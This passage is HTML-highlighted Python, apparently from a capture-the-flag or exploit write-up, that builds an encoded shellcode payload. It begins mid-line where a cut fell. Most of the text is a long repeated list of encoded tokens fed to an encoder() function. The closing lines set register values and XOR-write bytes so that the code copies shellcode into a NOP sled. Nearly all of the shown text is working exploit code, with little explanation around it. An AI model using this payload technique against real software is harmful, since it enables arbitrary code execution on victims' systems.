class=s1>&#39;G5&#39;</span><span class=p>,</span> <span class=s1>&#39;G8&#39;</span><span class=p>,</span> <span class=s1>&#39;G5&#39;</span><span class=p>,</span> <span class=s1>&#39;G8&#39;</span><span class=p>,</span> <span class=s1>&#39;G5&#39;</span><span class=p>,</span> <span class=s1>&#39;G8&#39;</span><span class=p>,</span> <span class=s1>&#39;G5&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;D2&#39;</span><span class=p>,</span> <span class=s1>&#39;C7&#39;</span><span class=p>,</span> <span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;D4&#39;</span><span class=p>,</span> <span class=s1>&#39;C3&#39;</span><span class=p>,</span> <span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;D4&#39;</span><span class=p>,</span> <span class=s1>&#39;F6&#39;</span><span class=p>,</span> <span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;B0&#39;</span><span class=p>,</span> <span class=s1>&#39;B4&#39;</span><span class=p>,</span> <span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;A4&#39;</span><span class=p>,</span> <span class=s1>&#39;A4&#39;</span><span class=p>,</span> <span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;E0&#39;</span><span class=p>,</span> <span class=s1>&#39;D1&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G3&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G7&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=c1># B6C#0&#34; : [&#34;inc edx&#34;, &#34;inc ebx&#34;, &#34;n esi, dword ptr [eax]&#34;] &lt; questo per l&#39;and con la maschera</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s2>&#34;B6A#0&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># esi alignement</span>
</span></span><span class=line><span class=cl><span class=c1># F8F0 : [&#34;inc esi&#34;, &#34;cmp byte ptr [esi + 0x30], al&#34;]</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s2>&#34;F8F0&#34;</span><span class=p>)</span><span class=o>*</span><span class=mi>3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#### COPYING THE SHELLCODE INTO THE NOP SLED</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Set al 0xa3</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G5&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G8&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G9&#39;</span><span class=p>,</span> <span class=s1>&#39;A2&#39;</span><span class=p>,</span> <span class=s1>&#39;E3&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=c1># Write on shellcode and inc esi to write next byte</span>
</span></span><span class=line><span class=cl><span class=c1># F0F0 : [&#34;inc esi&#34;, &#34;xor byte ptr [esi + 0x30], al&#34;];</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s2>&#34;F0F0&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Set al 0xd6</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;G6&#39;</span><span class=p>,</span> <span class=s1>&#39;E4&#39;</span><span class=p>,</span> <span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;E0&#39;</span><span class=p>,</span> <span class=s1>&#39;D9&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G4&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G5&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G6&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G7&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=c1># Write on shellcode and inc esi to write next byte</span>
</span></span><span class=line><span class=cl><span class=c1># F0F0 : [&#34;inc esi&#34;, &#34;xor byte ptr [esi + 0x30], al&#34;];</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s2>&#34;F0F0&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#Set al 0xa3</span>
